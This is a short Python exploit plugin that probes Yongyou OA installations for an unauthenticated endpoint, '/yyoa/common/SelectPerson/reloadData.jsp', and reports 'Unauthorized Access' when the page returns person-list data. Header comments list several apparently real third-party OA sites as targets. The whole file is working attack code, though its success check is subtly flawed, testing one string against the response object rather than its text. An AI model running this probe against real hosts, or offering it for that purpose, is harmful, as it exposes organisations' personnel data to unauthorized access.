# coding:utf-8
# http://www.yuanyuoa.com
# http://oa.chang-de.com:8088
# http://oa.hxjl.com.cn
# http://oa.decolor.cn
# http://oa.hxjl.com.cn
# http://oa.scey.cn:1000

import requests

class Exploit:

    def attack(self, url):
        path = "/yyoa/common/SelectPerson/reloadData.jsp"
        target = url+path

        response = requests.get(target)
        if response.status_code == 200 and 'insertObject' in response.text or 'personList' in response:
            return '{} Unauthorized Access!!!!'.format(target)

# print Exploit().attack('http://www.yuanyuoa.com')
#